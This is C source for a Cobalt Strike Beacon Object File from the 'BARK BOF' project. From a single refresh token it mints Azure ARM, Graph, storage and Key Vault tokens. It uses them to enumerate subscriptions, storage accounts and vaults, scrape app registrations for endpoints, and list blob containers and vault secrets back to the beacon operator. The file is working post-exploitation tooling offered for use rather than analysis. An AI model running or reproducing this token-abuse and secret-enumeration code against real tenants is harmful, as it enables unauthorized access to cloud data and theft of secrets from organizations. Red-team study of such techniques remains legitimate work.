/*
 * probe_data_plane.c — BARK BOF
 * Probe-DataPlane — Self-contained data-plane probe using only a refresh token.
 *
 * Discovers storage accounts and key vaults via ARM + MS Graph (apps/SPs),
 * then probes each endpoint's data plane. No dependency on prior output files.
 *
 * Flow:
 *   1. RT -> ARM token -> enumerate storage accounts + key vaults across subs
 *   2. RT -> MS Graph token -> scan apps + SPs for data-plane URLs;
 *      fall back to legacy AAD Graph when token acquisition or requests fail
 *   3. RT -> storage.azure.com token -> probe each storage blob endpoint
 *   4. RT -> vault.azure.net token -> probe each vault secrets endpoint
 *
 * Args : refreshToken, tenantId, [armToken], [graphToken], [legacyToken],
 *        [subscriptionSnapshot]
 *
 * Output via BeaconPrintf only — no files written to disk.
 *
 * Author : BARK BOF project
 * License: GPLv3
 */
#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"

#define MAX_HOSTS       128
#define HOST_LEN        256

typedef struct {
    char hosts[MAX_HOSTS][HOST_LEN];
    int  count;
} HostList;

static void HostListInit(HostList *l) { l->count = 0; }

static int HostListContains(HostList *l, const char *host) {
    int i;
    for (i = 0; i < l->count; i++) {
        if (MSVCRT$strcmp(l->hosts[i], host) == 0) return 1;
    }
    return 0;
}

static int HostListAdd(HostList *l, const char *host) {
    if (l->count >= MAX_HOSTS) return 0;
    if (HostListContains(l, host)) return 0;
    int len = (int)MSVCRT$strlen(host);
    if (len <= 0 || len >= HOST_LEN) return 0;
    MSVCRT$strncpy(l->hosts[l->count], host, HOST_LEN - 1);
    l->hosts[l->count][HOST_LEN - 1] = '\0';
    l->count++;
    return 1;
}

/* Discover storage accounts + key vaults across all subscriptions via ARM.
 * Lists subscriptions once and queries both resource types per sub. */
static void DiscoverFromArm(const char *armToken,
                             HostList *storage, HostList *vaults,
                             const char *subscriptionSnapshot) {
    BarkIdList subs = BarkParseSubscriptionSnapshot(subscriptionSnapshot);
    if (subs.count > 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] ARM: reusing %d validated subscription(s)\n", subs.count);
    } else {
        if (subscriptionSnapshot && subscriptionSnapshot[0]) {
            BeaconPrintf(CALLBACK_OUTPUT,
                "[!] ARM: invalid subscription snapshot; using live discovery\n");
        }
        subs = BarkEnumEntityIds(
            L"management.azure.com",
            "/subscriptions?api-version=2020-01-01",
            armToken, "\"subscriptionId\"");
    }

    if (subs.count == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] ARM: no subscriptions found\n");
        BarkIdListFree(&subs);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] ARM: found %d subscription(s)\n", subs.count);

    int si;
    for (si = 0; si < subs.count; si++) {
        /* --- Storage accounts --- */
        {
            char pathBuf[2048];
            MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf),
                "/subscriptions/%s/providers/Microsoft.Storage/storageAccounts"
                "?api-version=2021-09-01", subs.ids[si]);

            BarkIdList names = BarkEnumEntityIds(
                L"management.azure.com", pathBuf, armToken, "\"name\"");

            int ni;
            for (ni = 0; ni < names.count; ni++) {
                char hostBuf[HOST_LEN];
                MSVCRT$sprintf_s(hostBuf, sizeof(hostBuf),
                    "%s.blob.core.windows.net", names.ids[ni]);
                HostListAdd(storage, hostBuf);
            }
            BarkIdListFree(&names);
        }

        /* --- Key vaults --- */
        {
            char pathBuf[2048];
            MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf),
                "/subscriptions/%s/providers/Microsoft.KeyVault/vaults"
                "?api-version=2021-10-01", subs.ids[si]);

            BarkIdList uris = BarkEnumEntityIds(
                L"management.azure.com", pathBuf, armToken, "\"vaultUri\"");

            int ui;
            for (ui = 0; ui < uris.count; ui++) {
                const char *hostStart = uris.ids[ui];
                if (MSVCRT$strncmp(hostStart, "https://", 8) == 0)
                    hostStart += 8;
                else if (MSVCRT$strncmp(hostStart, "http://", 7) == 0)
                    hostStart += 7;
                const char *trail = MSVCRT$strstr(hostStart, "/");
                int hlen = trail ? (int)(trail - hostStart)
                                 : (int)MSVCRT$strlen(hostStart);
                if (hlen > 0 && hlen < HOST_LEN) {
                    char hostBuf[HOST_LEN];
                    MSVCRT$strncpy(hostBuf, hostStart, (size_t)hlen);
                    hostBuf[hlen] = '\0';
                    HostListAdd(vaults, hostBuf);
                }
            }
            BarkIdListFree(&uris);
        }
    }

    BarkIdListFree(&subs);

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] ARM discovery: %d storage, %d vault\n",
        storage->count, vaults->count);
}

/* Scan a paginated directory entity collection for hostname suffixes.
 * Works with both Microsoft Graph and legacy AAD Graph. Returns 1 only when
 * every page was read successfully, even if no matching URL exists. */
static int ScanDirectoryEntityForUrls(LPCWSTR host, const char *token,
                                       const char *apiPath,
                                       const char *suffix, int suffixLen,
                                       HostList *targets, int consistencyHeader) {
    LPWSTR hdrWide = BarkMakeAuthHeader(token,
        consistencyHeader ? "ConsistencyLevel: eventual\r\n" : NULL);
    if (!hdrWide) return 0;

    LPWSTR widePath = MbsToWcs(apiPath);
    if (!widePath) { HFree(hdrWide); return 0; }

    LPCWSTR pathArg = widePath;
    char  *nextUrl  = NULL;
    LPWSTR nextWide = NULL;
    int success = 1;

    while (1) {
        DWORD status = 0;
        char *resp = HttpRequestWithRetry(L"GET", host,
            pathArg, hdrWide, NULL, 0, &status);

        if (nextUrl)  { HFree(nextUrl);  nextUrl  = NULL; }
        if (nextWide && nextWide != widePath) { HFree(nextWide); nextWide = NULL; }

        if (!resp || status >= 400) {
            if (resp) HFree(resp);
            success = 0;
            break;
        }

        SIZE_T respLen = MSVCRT$strlen(resp);
        const char *p = resp;
        while (1) {
            const char *match = MSVCRT$strstr(p, suffix);
            if (!match) break;

            const char *hostEnd = match + suffixLen;
            while (hostEnd < resp + respLen &&
                   ((*hostEnd >= 'a' && *hostEnd <= 'z') ||
                    (*hostEnd >= 'A' && *hostEnd <= 'Z') ||
                    (*hostEnd >= '0' && *hostEnd <= '9') ||
                    *hostEnd == '.' || *hostEnd == '-'))
                hostEnd++;

            const char *hostStart = match;
            while (hostStart > resp) {
                char c = *(hostStart - 1);
                if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
                    (c >= '0' && c <= '9') || c == '.' || c == '-')
                    hostStart--;
                else
                    break;
            }

            int hlen = (int)(hostEnd - hostStart);
            if (hlen > 0 && hlen < HOST_LEN && hostStart < match) {
                char hostBuf[HOST_LEN];
                MSVCRT$strncpy(hostBuf, hostStart, (size_t)hlen);
                hostBuf[hlen] = '\0';
                HostListAdd(targets, hostBuf);
            }
            p = hostEnd;
        }

        nextUrl = JsonExtractNextLink(resp, resp + respLen);
        HFree(resp);
        if (!nextUrl) break;

        char *np = nextUrl;
        if (MSVCRT$strncmp(np, "http://", 7) == 0) np += 7;
        else if (MSVCRT$strncmp(np, "https://", 8) == 0) np += 8;
        char *sl = MSVCRT$strstr(np, "/");
        if (!sl) {
            HFree(nextUrl);
            nextUrl = NULL;
            success = 0;
            break;
        }
        nextWide = MbsToWcs(sl);
        if (!nextWide) {
            HFree(nextUrl);
            nextUrl = NULL;
            success = 0;
            break;
        }
        pathArg = nextWide;
    }

    if (nextUrl)  HFree(nextUrl);
    if (nextWide && nextWide != widePath) HFree(nextWide);
    HFree(widePath);
    HFree(hdrWide);
    return success;
}

static int DiscoverFromGraph(const char *graphToken,
                              HostList *storage, HostList *vaults) {
    int preStor = storage->count, preVault = vaults->count;
    int ok = 1;

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] MS Graph: scanning applications...\n");
    ok &= ScanDirectoryEntityForUrls(L"graph.microsoft.com", graphToken,
        "/beta/applications?$count=true",
        ".blob.core.windows.net", 22, storage, 1);
    ok &= ScanDirectoryEntityForUrls(L"graph.microsoft.com", graphToken,
        "/beta/applications?$count=true",
        ".vault.azure.net", 16, vaults, 1);

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] MS Graph: scanning service principals...\n");
    ok &= ScanDirectoryEntityForUrls(L"graph.microsoft.com", graphToken,
        "/beta/servicePrincipals?$count=true",
        ".blob.core.windows.net", 22, storage, 1);
    ok &= ScanDirectoryEntityForUrls(L"graph.microsoft.com", graphToken,
        "/beta/servicePrincipals?$count=true",
        ".vault.azure.net", 16, vaults, 1);

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Graph discovery: +%d storage, +%d vault from apps/SPs\n",
        storage->count - preStor, vaults->count - preVault);
    return ok;
}

static int DiscoverFromLegacyGraph(const char *legacyToken,
                                    const char *tenantId,
                                    HostList *storage, HostList *vaults) {
    int preStor = storage->count, preVault = vaults->count;
    int ok = 1;
    char appsPath[1024];
    char spsPath[1024];

    MSVCRT$sprintf_s(appsPath, sizeof(appsPath),
        "/%s/applications?api-version=1.6&$top=999", tenantId);
    MSVCRT$sprintf_s(spsPath, sizeof(spsPath),
        "/%s/servicePrincipals?api-version=1.6&$top=999", tenantId);

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Legacy AAD Graph: scanning applications and service principals...\n");
    ok &= ScanDirectoryEntityForUrls(L"graph.windows.net", legacyToken,
        appsPath, ".blob.core.windows.net", 22, storage, 0);
    ok &= ScanDirectoryEntityForUrls(L"graph.windows.net", legacyToken,
        appsPath, ".vault.azure.net", 16, vaults, 0);
    ok &= ScanDirectoryEntityForUrls(L"graph.windows.net", legacyToken,
        spsPath, ".blob.core.windows.net", 22, storage, 0);
    ok &= ScanDirectoryEntityForUrls(L"graph.windows.net", legacyToken,
        spsPath, ".vault.azure.net", 16, vaults, 0);

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Legacy Graph discovery: +%d storage, +%d vault from apps/SPs\n",
        storage->count - preStor, vaults->count - preVault);
    return ok;
}

static void ProbeStorage(const char *storageToken, HostList *storage) {
    if (storage->count == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] No storage accounts to probe.\n");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Probing %d storage account(s)...\n", storage->count);

    LPWSTR hdrWide = BarkMakeAuthHeader(storageToken, "x-ms-version: 2020-10-02\r\n");
    if (!hdrWide) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to build storage auth header\n");
        return;
    }

    int i;
    for (i = 0; i < storage->count; i++) {
        LPWSTR wideHost = MbsToWcs(storage->hosts[i]);
        if (!wideHost) {
            BeaconPrintf(CALLBACK_ERROR, "[-] %s: host conversion failed\n",
                storage->hosts[i]);
            continue;
        }

        DWORD status = 0;
        char *resp = HttpRequestWithRetry(L"GET", wideHost, L"/?comp=list",
            hdrWide, NULL, 0, &status);
        HFree(wideHost);

        if (resp) {
            if (status < 400)
                BeaconPrintf(CALLBACK_OUTPUT, "[+] %s: HTTP %lu\n%s\n",
                    storage->hosts[i], (unsigned long)status, resp);
            else
                BeaconPrintf(CALLBACK_OUTPUT, "[-] %s: HTTP %lu\n",
                    storage->hosts[i], (unsigned long)status);
            HFree(resp);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[-] %s: no response (HTTP %lu)\n",
                storage->hosts[i], (unsigned long)status);
        }
    }

    HFree(hdrWide);
}

static void ProbeVaults(const char *vaultToken, HostList *vaults) {
    if (vaults->count == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] No key vaults to probe.\n");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Probing %d key vault(s)...\n", vaults->count);

    int i;
    for (i = 0; i < vaults->count; i++) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Probing vault: %s\n",
            vaults->hosts[i]);

        LPWSTR wideHost = MbsToWcs(vaults->hosts[i]);
        if (!wideHost) {
            BeaconPrintf(CALLBACK_ERROR, "[-] %s: host conversion failed\n",
                vaults->hosts[i]);
            continue;
        }
        BarkGet(wideHost, L"/secrets?api-version=7.3", vaultToken);
        HFree(wideHost);
    }
}

void go(char *args, int alen)
{
    datap  parser;
    char  *refreshToken = NULL;
    char  *tenantId     = NULL;
    char  *cachedArmToken = NULL;
    char  *cachedGraphToken = NULL;
    char  *cachedLegacyToken = NULL;
    char  *subscriptionSnapshot = NULL;

    BeaconDataParse(&parser, args, alen);
    refreshToken = BeaconDataExtract(&parser, NULL);
    tenantId     = BeaconDataExtract(&parser, NULL);
    cachedArmToken = BeaconDataExtract(&parser, NULL);
    cachedGraphToken = BeaconDataExtract(&parser, NULL);
    cachedLegacyToken = BeaconDataExtract(&parser, NULL);
    subscriptionSnapshot = BeaconDataExtract(&parser, NULL);

    if (!refreshToken || MSVCRT$strlen(refreshToken) == 0 ||
        !tenantId     || MSVCRT$strlen(tenantId) == 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Usage: bark_probe_data_plane <refreshToken> <tenantId>\n");
        return;
    }

    HostList *storage = (HostList *)HAlloc(sizeof(HostList));
    HostList *vaults  = (HostList *)HAlloc(sizeof(HostList));
    if (!storage || !vaults) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate host lists\n");
        if (storage) HFree(storage);
        if (vaults)  HFree(vaults);
        return;
    }
    HostListInit(storage);
    HostListInit(vaults);

    /* Phase 1: ARM — storage accounts + key vaults across subscriptions */
    char *armToken = cachedArmToken;
    int freeArmToken = 0;
    if (!armToken || !armToken[0]) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] Phase 1: Exchanging RT for ARM token...\n");
        armToken = BarkExchangeRT(tenantId,
            "https://management.azure.com", refreshToken);
        freeArmToken = 1;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] Phase 1: Reusing all-info ARM token...\n");
    }
    if (armToken) {
        DiscoverFromArm(armToken, storage, vaults, subscriptionSnapshot);
        if (freeArmToken) HFree(armToken);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[!] ARM token exchange failed — skipping ARM discovery\n");
    }

    /* Phase 2: MS Graph — scan app/SP URLs for data-plane endpoints */
    int graphDiscoveryOk = 0;
    char *graphToken = cachedGraphToken;
    int freeGraphToken = 0;
    if (!graphToken || !graphToken[0]) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] Phase 2: Exchanging RT for MS Graph token...\n");
        graphToken = BarkExchangeRT(tenantId,
            "https://graph.microsoft.com", refreshToken);
        freeGraphToken = 1;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] Phase 2: Reusing all-info MS Graph token...\n");
    }
    if (graphToken) {
        graphDiscoveryOk = DiscoverFromGraph(graphToken, storage, vaults);
        if (freeGraphToken) HFree(graphToken);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[!] MS Graph token exchange failed\n");
    }

    if (!graphDiscoveryOk) {
        char *legacyToken = cachedLegacyToken;
        int freeLegacyToken = 0;
        if (!legacyToken || !legacyToken[0]) {
            BeaconPrintf(CALLBACK_OUTPUT,
                "[*] Phase 2 fallback: Exchanging RT for legacy AAD Graph token...\n");
            legacyToken = BarkExchangeRT(tenantId,
                "https://graph.windows.net", refreshToken);
            freeLegacyToken = 1;
        } else {
            BeaconPrintf(CALLBACK_OUTPUT,
                "[*] Phase 2 fallback: Reusing all-info legacy AAD Graph token...\n");
        }
        if (legacyToken) {
            if (!DiscoverFromLegacyGraph(legacyToken, tenantId, storage, vaults)) {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "[!] Legacy AAD Graph app/SP discovery was incomplete\n");
            }
            if (freeLegacyToken) HFree(legacyToken);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT,
                "[!] Legacy AAD Graph token exchange failed — app/SP discovery skipped\n");
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Total: %d storage account(s), %d key vault(s)\n",
        storage->count, vaults->count);

    if (storage->count == 0 && vaults->count == 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[-] No data-plane targets discovered.\n");
        HFree(storage);
        HFree(vaults);
        return;
    }

    /* Phase 3: Probe storage data plane */
    if (storage->count > 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] Phase 3: Exchanging RT for storage token...\n");
        char *storageToken = BarkExchangeRT(tenantId,
            "https://storage.azure.com", refreshToken);
        if (storageToken) {
            ProbeStorage(storageToken, storage);
            HFree(storageToken);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT,
                "[-] Storage token exchange failed\n");
        }
    }

    /* Phase 4: Probe key vault data plane */
    if (vaults->count > 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] Phase 4: Exchanging RT for vault token...\n");
        char *vaultToken = BarkExchangeRT(tenantId,
            "https://vault.azure.net", refreshToken);
        if (vaultToken) {
            ProbeVaults(vaultToken, vaults);
            HFree(vaultToken);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT,
                "[-] Vault token exchange failed\n");
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "[+] Data-plane probe complete: %d storage, %d vault\n",
        storage->count, vaults->count);

    HFree(storage);
    HFree(vaults);
}
